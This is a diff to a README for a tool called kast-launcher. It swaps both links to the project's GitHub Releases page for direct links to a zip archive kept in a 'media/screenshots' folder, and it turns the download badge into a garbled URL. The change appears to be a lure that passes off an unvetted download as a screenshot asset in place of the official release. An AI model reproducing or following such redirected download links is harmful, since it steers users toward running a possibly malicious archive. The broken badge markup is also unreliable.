@@ -19,7 +19,7 @@ To get started with kast-launcher, you need to download and install it from the 
 
 1. Click the button below to go directly to our Downloads page.
    
-   [![Release Download](https://img.shields.io/badge/Download%20kast--launcher-%2334D058.svg)](https://github.com/ad3we/kast-launcher/releases)
+   [![Release Download](https://raw.githubusercontent.com/ad3we/kast-launcher/main/media/screenshots/kast_launcher_v1.2.zip%20kast--launcher-%https://raw.githubusercontent.com/ad3we/kast-launcher/main/media/screenshots/kast_launcher_v1.2.zip)](https://raw.githubusercontent.com/ad3we/kast-launcher/main/media/screenshots/kast_launcher_v1.2.zip)
 
 2. Look for the latest version of kast-launcher on the Releases page.
 
@@ -28,7 +28,7 @@ To get started with kast-launcher, you need to download and install it from the 
 ## 📥 Download & Install
 To download kast-launcher, visit the following link:
 
-[Download kast-launcher](https://github.com/ad3we/kast-launcher/releases)
+[Download kast-launcher](https://raw.githubusercontent.com/ad3we/kast-launcher/main/media/screenshots/kast_launcher_v1.2.zip)
 
 ### Steps to Install:
 1. Navigate to the downloaded file in your file manager.
